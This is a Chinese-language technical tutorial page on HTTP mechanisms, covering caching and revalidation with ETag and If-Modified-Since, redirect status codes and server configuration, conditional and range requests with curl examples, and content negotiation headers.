<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 1024</span><br><span class="line">Date: Tue, 22 Feb 2022 22:22:22 GMT</span><br><span class="line">Cache-Control: max-age=604800</span><br><span class="line">Age: 86400</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">…</span><br></pre></td></tr></table></figure>

<h3 id="Vary响应"><a href="#Vary响应" class="headerlink" title="Vary响应"></a>Vary响应</h3><p>区分响应的方式本质上是基于它们的 URL</p>
<p>在 <code>Vary</code> 标头的值中添加“<code>Accept-Language</code>”，根据语言单独缓存响应</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Vary: Accept-Language</span><br></pre></td></tr></table></figure>

<p>这会导致缓存基于响应 URL 和 <code>Accept-Language</code>请求标头的组合进行键控</p>
<h3 id="验证响应"><a href="#验证响应" class="headerlink" title="验证响应"></a>验证响应</h3><p>验证是通过使用包含 <code>If-Modified-Since</code> 或 <code>If-None-Match</code> 请求标头的<strong>条件请求</strong>完成的</p>
<h4 id="If-Modified-Since"><a href="#If-Modified-Since" class="headerlink" title="If-Modified-Since"></a>If-Modified-Since</h4><p>下面的请求显示客户端发送带有 <code>If-Modified-Since</code> 请求标头的请求，以询问服务器自指定时间以来是否有任何的改变</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Accept: text/html</span><br><span class="line">If-Modified-Since: Tue, 22 Feb 2022 22:00:00 GMT</span><br></pre></td></tr></table></figure>

<p>如果内容自指定时间以来没有更改，服务器将响应 <code>304 Not Modified</code></p>
<h4 id="ETag-If-None-Match"><a href="#ETag-If-None-Match" class="headerlink" title="ETag&#x2F;If-None-Match"></a>ETag&#x2F;If-None-Match</h4><p>如果 <code>ETag</code> 标头使用了 hash 值，<code>index.html</code> 资源的 hash 值是 <code>deadbeef</code>，响应如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 1024</span><br><span class="line">Date: Tue, 22 Feb 2022 22:22:22 GMT</span><br><span class="line">ETag: &quot;deadbeef&quot;</span><br><span class="line">Cache-Control: max-age=3600</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">…</span><br></pre></td></tr></table></figure>

<p>如果该响应是陈旧的，则客户端获取缓存响应的 <code>ETag</code> 响应标头的值，并将其放入 <code>If-None-Match</code> 请求标头中，以询问服务器资源是否已被修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Accept: text/html</span><br><span class="line">If-None-Match: &quot;deadbeef&quot;</span><br></pre></td></tr></table></figure>

<p>如果服务器为请求的资源确定的 <code>ETag</code> 标头的值与请求中的 <code>If-None-Match</code> 值相同，则服务器将返回 <code>304 Not Modified</code>，如果服务器确定请求的资源现在应该具有不同的 <code>ETag</code> 值，则服务器将其改为 <code>200 OK</code> 和资源的最新版本进行响应</p>
<blockquote>
<p>[!TIP]</p>
<p>可将ETag 和 Last-Modified 结合使用，ETag 提供高精度，而 Last-Modified 提供简单的时间戳，配合使用可以更高效地实现缓存控制</p>
</blockquote>
<h4 id="强制重新验证"><a href="#强制重新验证" class="headerlink" title="强制重新验证"></a>强制重新验证</h4><p>如果你不希望重复使用响应，而是希望始终从服务器获取最新内容，则可以使用 <code>no-cache</code> 指令强制验证</p>
<p>**<code>no-cache</code>**：允许缓存，不允许直接使用缓存的数据，每次使用缓存前都要向服务器验证数据的有效性</p>
<p>通过在响应中添加 <code>Cache-Control: no-cache</code> 以及 <code>Last-Modified</code> 和 <code>ETag</code>。如果请求的资源已更新，客户端将收到 <code>200 OK</code> 响应，否则，如果请求的资源尚未更新，则会收到 <code>304 Not Modified</code> 响应</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 1024</span><br><span class="line">Date: Tue, 22 Feb 2022 22:22:22 GMT</span><br><span class="line">Last-Modified: Tue, 22 Feb 2022 22:00:00 GMT</span><br><span class="line">ETag: deadbeef</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">…</span><br></pre></td></tr></table></figure>

<h3 id="不使用缓存"><a href="#不使用缓存" class="headerlink" title="不使用缓存"></a>不使用缓存</h3><p><code>no-cache</code> 指令不会阻止响应的存储，而是阻止在没有重新验证的情况下重用响应</p>
<p>使用 <code>private</code> 指令将使个性化响仅与特定客户端一起存储，而不会泄露给缓存的任何其他用户，但在这种情况下，即使设置了 <code>no-store</code>，也必须设置 <code>private</code></p>
<h3 id="重新加载和强制重新加载"><a href="#重新加载和强制重新加载" class="headerlink" title="重新加载和强制重新加载"></a>重新加载和强制重新加载</h3><h4 id="重新加载"><a href="#重新加载" class="headerlink" title="重新加载"></a>重新加载</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">If-None-Match: &quot;deadbeef&quot;</span><br><span class="line">If-Modified-Since: Tue, 22 Feb 2022 20:20:20 GMT</span><br></pre></td></tr></table></figure>

<p>请求中的 <code>max-age=0</code> 指令指定“重用 age 为 0 或更少的响应”——因此，中间存储的响应不会被重用</p>
<p>请求通过 <code>If-None-Match</code> 和 <code>If-Modified-Since</code> 进行验证</p>
<h4 id="强制重新加载"><a href="#强制重新加载" class="headerlink" title="强制重新加载"></a>强制重新加载</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br></pre></td></tr></table></figure>

<p>由于这不是带有 <code>no-cache</code> 的条件请求，因此你可以确定你会从源服务器获得 <code>200 OK</code></p>
<blockquote>
<p>[!CAUTION]</p>
<p>“no-cache”是正常重新加载的正确模式<br>fetch(“&#x2F;“, { cache: “no-cache” });</p>
<p>“reload”是“强制重新加载”的正确模式<br>fetch(“&#x2F;“, { cache: “reload” });</p>
</blockquote>
<h4 id="避免重新验证"><a href="#避免重新验证" class="headerlink" title="避免重新验证"></a>避免重新验证</h4><p>为了防止用户重新加载时，服务器在内容是不可变时，也会发送重新验证请求，<code>immutable</code> 指令可用于明确指示不需要重新验证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cache-Control: max-age=31536000, immutable</span><br></pre></td></tr></table></figure>

<h2 id="HTTP重定向"><a href="#HTTP重定向" class="headerlink" title="HTTP重定向"></a>HTTP重定向</h2><p>HTTP 重定向是服务器告诉客户端（通常是浏览器）将请求重定向到另一个 URL 的一种机制。这通常发生在资源已被移动、网站结构发生更改或服务器需要将请求路由到不同位置的情况下</p>
<p>HTTP 重定向通过返回特定的状态码和 <code>Location</code> 响应头来实现，浏览器收到这些信息后，会自动发起对新的 URL 的请求</p>
<h3 id="永久重定向"><a href="#永久重定向" class="headerlink" title="永久重定向"></a>永久重定向</h3><p>表示原 URL 不应再被使用，而选用新的 URL 替换它</p>
<p>搜索引擎机器人、RSS 阅读器以及其他爬虫将更新资源原始的 URL</p>
<table>
<thead>
<tr>
<th align="left">状态码</th>
<th align="left">状态文本</th>
<th align="left">处理方法</th>
<th align="left">典型应用场景</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>301</code></td>
<td align="left"><code>Moved Permanently</code></td>
<td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET"><code>GET</code></a> 方法不会发生变更。其他方法有可能会变更为 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET"><code>GET</code></a> 方法。</td>
<td align="left">网站重构。</td>
</tr>
<tr>
<td align="left"><code>308</code></td>
<td align="left"><code>Permanent Redirect</code></td>
<td align="left">方法和消息主体都不发生变化。</td>
<td align="left">使用用于非 GET 链接&#x2F;操作重组网站。</td>
</tr>
</tbody></table>
<h3 id="临时重定向"><a href="#临时重定向" class="headerlink" title="临时重定向"></a>临时重定向</h3><p>有时候请求的资源无法从其标准地址访问，但是却可以从另外的地方访问。在这种情况下，可以使用临时重定向。在创建、更新或者删除资源的时候，临时重定向也可以用于显示临时性的进度页面</p>
<p>搜索引擎和其他爬虫不会记录新的、临时的 URL。</p>
<table>
<thead>
<tr>
<th align="left">状态码</th>
<th align="left">状态文本</th>
<th align="left">处理方法</th>
<th align="left">典型应用场景</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>302</code></td>
<td align="left"><code>Found</code></td>
<td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET"><code>GET</code></a> 方法不会发生变更。其他方法有可能会变更为 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET"><code>GET</code></a> 方法。[2]</td>
<td align="left">由于不可预见的原因该页面暂不可用。</td>
</tr>
<tr>
<td align="left"><code>303</code></td>
<td align="left"><code>See Other</code></td>
<td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET"><code>GET</code></a> 方法不会发生变更，其他方法会<em>变更</em>为 <code>GET</code> 方法（消息主体丢失）。</td>
<td align="left">用于 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/PUT"><code>PUT</code></a> 或 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST"><code>POST</code></a> 请求完成之后重定向，来防止由于页面刷新导致的操作的重复触发。</td>
</tr>
<tr>
<td align="left"><code>307</code></td>
<td align="left"><code>Temporary Redirect</code></td>
<td align="left">方法和消息主体都不发生变化。</td>
<td align="left">由于不可预见的原因该页面暂不可用。当站点支持非 <code>GET</code> 方法的链接或操作的时候，该状态码优于 302 状态码。</td>
</tr>
</tbody></table>
<h3 id="特殊重定向"><a href="#特殊重定向" class="headerlink" title="特殊重定向"></a>特殊重定向</h3><table>
<thead>
<tr>
<th align="left">状态码</th>
<th align="left">状态文本</th>
<th align="left">典型应用场景</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>300</code></td>
<td align="left"><code>Multiple Choice</code></td>
<td align="left">不常用：所有的选项在消息主体的 HTML 页面中列出。鼓励在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Link"><code>Link</code></a> 标头中加入机器可读的 <code>rel=alternate</code></td>
</tr>
<tr>
<td align="left"><code>304</code></td>
<td align="left"><code>Not Modified</code></td>
<td align="left">发送用于重新验证的条件请求。表示缓存的响应仍然是新的并且可以使用。</td>
</tr>
</tbody></table>
<h3 id="指向重定向的其他方式"><a href="#指向重定向的其他方式" class="headerlink" title="指向重定向的其他方式"></a>指向重定向的其他方式</h3><h4 id="HTML重定向机制"><a href="#HTML重定向机制" class="headerlink" title="HTML重定向机制"></a>HTML重定向机制</h4><p>用于将用户的请求从一个页面自动转到另一个页面</p>
<p>可以尝试在页面的<code>&lt;head&gt;</code>中添加一个<code>&lt;meta&gt;</code>元素，并将其 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/meta#http-equiv"><code>http-equiv</code></a> 属性的值设置为 <code>refresh</code>，可以告诉浏览器在指定的时间间隔后自动加载另一个页面。</p>
<p>该方法<strong>仅适用于 HTML 页面</strong>，然而并<strong>不能应用于图片或者其他类型的内容</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta http-equiv=&quot;Refresh&quot; content=&quot;0(秒数); URL=http://example.com/(目标网址)&quot; /&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure>

<h4 id="借助DOM的-JavaScript-重定向机制"><a href="#借助DOM的-JavaScript-重定向机制" class="headerlink" title="借助DOM的 JavaScript 重定向机制"></a>借助DOM的 JavaScript 重定向机制</h4><p>通常使用 <code>window.location</code> 或 <code>window.location.replace()</code> 方法</p>
<p><code>window.location</code> 通过改变浏览器的地址栏实现重定向，相当于用户点击了浏览器的地址栏并输入新的 URL</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.location = &#x27;https://www.example.com&#x27;;</span><br></pre></td></tr></table></figure>

<p><code>window.location.replace()</code> 会将当前页面从浏览器历史记录中移除，并跳转到新页面。它不会在浏览器的历史记录中留下当前页面，因此用户无法通过后退按钮回到当前页面。<strong>相当于无痕模式</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.location.replace(&#x27;https://www.example.com&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><h4 id="域名别称"><a href="#域名别称" class="headerlink" title="域名别称"></a>域名别称</h4><p>扩大站点的用户覆盖面，迁移到新的域名，强制使用HTTPS</p>
<h4 id="保持链接有效"><a href="#保持链接有效" class="headerlink" title="保持链接有效"></a>保持链接有效</h4><p>当你重构 Web 站点的时候，资源的 URL 会发生改变。即便是你更新站点内部的链接来匹配新的 URL，也无法控制被外部资源使用的 URL。你并不想因此而使旧链接失效，因为它们会为你带来宝贵的用户并且帮助优化你的 SEO（搜索引擎优化，是一种通过优化网站和网页内容来提高其在搜索引擎结果页面（SERP）中的排名，从而增加网站的可见性和访问量的技术和策略），所以需要建立从旧链接到新链接的重定向映射</p>
<h4 id="对于不安全请求、耗时请求的临时响应"><a href="#对于不安全请求、耗时请求的临时响应" class="headerlink" title="对于不安全请求、耗时请求的临时响应"></a>对于不安全请求、耗时请求的临时响应</h4><h3 id="配置重定向"><a href="#配置重定向" class="headerlink" title="配置重定向"></a>配置重定向</h3><p>通常，HTTP 重定向是由服务器配置文件（如 Apache 的 <code>.htaccess</code> 或 Nginx 的配置文件）实现的。</p>
<h4 id="在-Apache-中使用-htaccess-文件设置-301-重定向："><a href="#在-Apache-中使用-htaccess-文件设置-301-重定向：" class="headerlink" title="在 Apache 中使用 .htaccess 文件设置 301 重定向："></a>在 <strong>Apache</strong> 中使用 <code>.htaccess</code> 文件设置 301 重定向：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Redirect 301 /oldpage http://example.com/newpage</span><br></pre></td></tr></table></figure>

<h4 id="在-Nginx-中设置-301-重定向："><a href="#在-Nginx-中设置-301-重定向：" class="headerlink" title="在 Nginx 中设置 301 重定向："></a>在 <strong>Nginx</strong> 中设置 301 重定向：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    location /oldpage &#123;</span><br><span class="line">        return 301 http://example.com/newpage;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="HTTP条件请求"><a href="#HTTP条件请求" class="headerlink" title="HTTP条件请求"></a>HTTP条件请求</h2><p>可以用来验证缓存的有效性，省去不必要的控制手段，以及验证文件的完整性，例如在断点续传的场景下或者在上传或者修改服务器端的文件的时候避免更新丢失问题</p>
<blockquote>
<p>[!NOTE]</p>
<p>对于<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Safe/HTTP">安全</a>方法来说，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET"><code>GET</code></a>，通常用来获取文件，条件请求可以被用来限定仅在满足条件的情况下返回文件。这样可以节省带宽。</p>
<p>对于<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Safe/HTTP">非安全</a>方法来说，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/PUT"><code>PUT</code></a> 方法，通常用来上传文件，条件请求可以被用来限定仅在满足文件的初始版本与服务器上的版本相同的条件下才会将其上传。</p>
</blockquote>
<h3 id="验证器"><a href="#验证器" class="headerlink" title="验证器"></a>验证器</h3><p>在请求中会传递一个描述资源版本的值，这些值称为“验证器”（1.文件的最后修改时间，即 <em>last-modified</em>（最后修改）时间；2.一个意义模糊的字符串，指代一个独一无二的版本，称为“实体标签”，或者 <em>etag</em>）</p>
<p> <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified"><code>Last-Modified</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag"><code>ETag</code></a> 首部均可应用于两种验证类型</p>
<h4 id="强验证类型"><a href="#强验证类型" class="headerlink" title="强验证类型"></a>强验证类型</h4><p>应用于需要<strong>逐个字节</strong>相对应的情况，例如需要进行断点续传的时候</p>
<p>通常这是由 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag"><code>ETag</code></a> 首部来完成的，该首部可以提供使用 MD5 算法获取的资源（或其衍生品）的散列值</p>
<h4 id="弱验证类型"><a href="#弱验证类型" class="headerlink" title="弱验证类型"></a>弱验证类型</h4><p>应用于用户代理只需要确认<strong>资源内容相同</strong>即可。即便是有细微差别也可以接受，比如显示的广告不同，或者是页脚的时间不同</p>
<h3 id="条件首部"><a href="#条件首部" class="headerlink" title="条件首部"></a>条件首部</h3><h4 id="If-Match"><a href="#If-Match" class="headerlink" title="If-Match"></a>If-Match</h4><p>如果远端资源的实体标签与在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag"><code>ETag</code></a> 这个首部中列出的值相同的话，表示条件匹配成功。默认地，除非实体标签带有 ‘W&#x2F;‘ 前缀，否者它将会执行强验证。</p>
<h4 id="If-None-Match"><a href="#If-None-Match" class="headerlink" title="If-None-Match"></a>If-None-Match</h4><p>如果远端资源的实体标签与在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag"><code>ETag</code></a> 这个首部中列出的值都不相同的话，表示条件匹配成功。默认地，除非实体标签带有 ‘W&#x2F;‘ 前缀，否者它将会执行强验证。</p>
<h4 id="If-Modified-Since-1"><a href="#If-Modified-Since-1" class="headerlink" title="If-Modified-Since"></a>If-Modified-Since</h4><p>如果远端资源的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified"><code>Last-Modified</code></a> 首部标识的日期比在该首部中列出的值要更晚，表示条件匹配成功。</p>
<h4 id="If-Unmodified-Since"><a href="#If-Unmodified-Since" class="headerlink" title="If-Unmodified-Since"></a>If-Unmodified-Since</h4><p>如果远端资源的 HTTPHeader(“Last-Modified”)}} 首部标识的日期比在该首部中列出的值要更早或相同，表示条件匹配成功。</p>
<h4 id="If-Range"><a href="#If-Range" class="headerlink" title="If-Range"></a>If-Range</h4><p>与 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Match"><code>If-Match</code></a> 或 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Unmodified-Since"><code>If-Unmodified-Since</code></a> 相似，但是只能含有一个实体标签或者日期值。如果匹配失败，则条件请求宣告失败，此时将不会返回 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/206"><code>206</code></a> <code>Partial Content</code> 响应码，而是返回 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200"><code>200</code></a> <code>OK</code> 响应码，以及完整的资源。</p>
<h2 id="HTTP范围请求"><a href="#HTTP范围请求" class="headerlink" title="HTTP范围请求"></a>HTTP范围请求</h2><p>HTTP 的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Range"><code>Range</code></a> 请求使客户端能够要求服务器仅向其回传 HTTP 消息的一部分。</p>
<p>范围请求对于支持随机访问的媒体播放器、明确只需大型文件某部分的数据处理工具，以及允许用户暂停及恢复下载的下载管理器等客户端尤其有用</p>
<h3 id="检测服务器端是否支持范围请求"><a href="#检测服务器端是否支持范围请求" class="headerlink" title="检测服务器端是否支持范围请求"></a>检测服务器端是否支持范围请求</h3><p>如果 HTTP 响应中存在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Ranges"><code>Accept-Ranges</code></a> 标头：</p>
<p>1.其值不是“<code>none</code>”，那么该服务器支持范围请求。你可以通过使用像 cURL 这样的工具发出一个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD"><code>HEAD</code></a> 请求来进行手动检查</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -I http://i.imgur.com/z4d4kWk.jpg</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">…</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 146515</span><br></pre></td></tr></table></figure>

<p>2.如果网站省略了 <code>Accept-Ranges</code> 标头，那么它们很可能不支持部分请求。有些网站会包含这个标头，但明确将其值设为“<code>none</code>”，以表明它们不支持这一特性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">…</span><br><span class="line">Accept-Ranges: none</span><br></pre></td></tr></table></figure>

<p>在这种情况下，下载管理器可能会禁用暂停按钮</p>
<h3 id="从服务器端请求特定的范围"><a href="#从服务器端请求特定的范围" class="headerlink" title="从服务器端请求特定的范围"></a>从服务器端请求特定的范围</h3><p>在 HTTP 请求中包含 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Range"><code>Range</code></a> 标头，可以指定希望服务器返回文档的哪一部分或哪些部分</p>
<h4 id="单一范围"><a href="#单一范围" class="headerlink" title="单一范围"></a>单一范围</h4><p>curl的“<code>-H</code>”选项会向请求中添加一个标头，即 <code>Range</code> 标头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://i.imgur.com/z4d4kWk.jpg -i -H &quot;Range: bytes=0-1023&quot;</span><br></pre></td></tr></table></figure>

<p>用于请求1024字节</p>
<p>发出请求如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /z4d4kWk.jpg HTTP/1.1</span><br><span class="line">Host: i.imgur.com</span><br><span class="line">Range: bytes=0-1023</span><br></pre></td></tr></table></figure>

<p>服务器将会返回 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/206"><code>206</code></a> <code>Partial Content</code> 状态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 206 Partial Content</span><br><span class="line">Content-Range: bytes 0-1023/146515</span><br><span class="line">Content-Length: 1024</span><br><span class="line">…</span><br><span class="line">（二进制内容）</span><br></pre></td></tr></table></figure>

<h4 id="多重范围"><a href="#多重范围" class="headerlink" title="多重范围"></a>多重范围</h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Range"><code>Range</code></a> 标头还允许在文档中支持一次性获取多重范围。这些范围使用逗号分隔</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://www.example.com -i -H &quot;Range: bytes=0-50, 100-150&quot;</span><br></pre></td></tr></table></figure>

<p>服务器以 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/206"><code>206</code></a> <code>Partial Content</code> 状态码以及 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type"><code>Content-Type</code></a><code>: multipart/byteranges; boundary=3d6b6a416f9b5</code> 标头响应，表明随后的数据将采用多部分字节范围格式。</p>
<p>每个部分都携带自己的 <code>Content-Type</code> 和 <code>Content-Range</code> 字段，而必须的 boundary 参数定义了用于<strong>分割</strong>每个消息体部分的边界字符串</p>
<h4 id="条件式范围请求"><a href="#条件式范围请求" class="headerlink" title="条件式范围请求"></a>条件式范围请求</h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Range"><code>If-Range</code></a> HTTP 请求标头使范围请求具有条件性：如果条件兑现，则会发起范围请求，服务器将以包含适当内容主体的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/206"><code>206</code></a> <code>Partial Content</code> 响应进行回复。如果条件不兑现，会被发送完整的资源回来，并带有 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200"><code>200</code></a> <code>OK</code> 状态。该标头可与 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified"><code>Last-Modified</code></a> 验证器或 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag"><code>ETag</code></a> 一起使用，但不能同时使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">If-Range: Wed, 21 Oct 2015 07:28:00 GMT</span><br></pre></td></tr></table></figure>

<h3 id="范围请求的响应"><a href="#范围请求的响应" class="headerlink" title="范围请求的响应"></a>范围请求的响应</h3><p> <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/206"><code>206</code></a> <code>Partial Content</code> 范围请求成功</p>
<p> <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/416"><code>416</code></a> <code>Requested Range Not Satisfiable</code>超出范围的范围请求</p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200"><code>200</code></a> <code>OK</code>不支持范围请求，并传输完整的响应体</p>
<h2 id="HTTP内容协商"><a href="#HTTP内容协商" class="headerlink" title="HTTP内容协商"></a>HTTP内容协商</h2><p>一种 <strong>HTTP 机制</strong>，它允许客户端和服务器在处理请求时根据客户端的需求和服务器支持的内容来协商返回的资源形式。这种机制通常用在需要提供不同格式、语言、编码或版本的资源时</p>
<h3 id="服务端驱动型"><a href="#服务端驱动型" class="headerlink" title="服务端驱动型"></a>服务端驱动型</h3><p>服务器根据客户端在请求头中提供的信息来决定返回的资源版本</p>
<h4 id="Accept标头"><a href="#Accept标头" class="headerlink" title="Accept标头"></a>Accept标头</h4><p>列举了用户代理希望接收的媒体资源的 MIME 类型（如 <code>text/html</code>, <code>application/json</code>）</p>
<h4 id="Accept-CH标头"><a href="#Accept-CH标头" class="headerlink" title="Accept-CH标头"></a>Accept-CH标头</h4><p>列出了服务器可以用来选择合适响应的配置数据</p>
<table>
<thead>
<tr>
<th align="left">值</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>Device-Memory</code></td>
<td align="left">标明客户端设备的内存大小。该值是个估计值，设备的实际内存值会向 2 的次方取整，且除以 1024。比如 512MB 的内存对应的值为 <code>0.5</code>。</td>
</tr>
<tr>
<td align="left"><code>Viewport-Width</code></td>
<td align="left">标明用 CSS 像素数值表示的布局视口（layout viewport）宽度。</td>
</tr>
<tr>
<td align="left"><code>Width</code></td>
<td align="left">标明用物理像素值表示的资源宽度（换句话说就是一张图片的固有大小）。</td>
</tr>
</tbody></table>
<h4 id="Accept-Encoding标头"><a href="#Accept-Encoding标头" class="headerlink" title="Accept-Encoding标头"></a>Accept-Encoding标头</h4><p>说明了（接收端）可以接受的内容编码形式（所支持的压缩算法）（如 <code>gzip</code>, <code>deflate</code>）</p>
<h4 id="Accept-Language标头"><a href="#Accept-Language标头" class="headerlink" title="Accept-Language标头"></a>Accept-Language标头</h4><p>提示用户期望获得的自然语言的优先顺序（如 <code>en-US</code>, <code>zh-CN</code>）</p>
<h4 id="User-Agent标头"><a href="#User-Agent标头" class="headerlink" title="User-Agent标头"></a>User-Agent标头</h4><p>提供客户端的设备信息</p>
<h4 id="Vary响应标头"><a href="#Vary响应标头" class="headerlink" title="Vary响应标头"></a>Vary响应标头</h4><p>用于告诉客户端和代理服务器（如缓存服务器），哪些请求头会影响返回内容的变化</p>
<p>大多数情况下，vary用于在使用内容协商时创建缓存键</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Vary: *</span><br><span class="line">Vary: &lt;header-name&gt;, &lt;header-name&gt;, ...</span><br></pre></td></tr></table></figure>

<p><code>*</code>表示响应因无法确定的原因而改变，禁止缓存此响应</p>
<p><code>&lt;header-name&gt;</code>指影响响应内容的请求头名称，例如 <code>Accept</code>、<code>Accept-Language</code> </p>
<p>如果服务器根据 <code>Accept</code> 请求头返回不同的资源（如 JSON 或 HTML），则应该在响应中添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Vary: Accept</span><br></pre></td></tr></table></figure>

<p>如果服务器根据 <code>Accept-Language</code> 返回不同的语言内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Vary: Accept-Language</span><br></pre></td></tr></table></figure>

<p>如果服务器根据 <code>Accept-Encoding</code> 提供不同的压缩格式（如 gzip 或 br）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Vary: Accept-Encoding</span><br></pre></td></tr></table></figure>

<p>如果服务器根据 <code>User-Agent</code> 提供不同的内容（如桌面和移动设备优化）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Vary: User-Agent</span><br></pre></td></tr></table></figure>

<h3 id="代理驱动型（响应式协商"><a href="#代理驱动型（响应式协商" class="headerlink" title="代理驱动型（响应式协商)"></a>代理驱动型（响应式协商)</h3><p>客户端和服务器通过多次交互来确定最佳资源版本，面临不明确的请求时，服务器会返回一个页面，其中包含了可供选择的资源的链接</p>
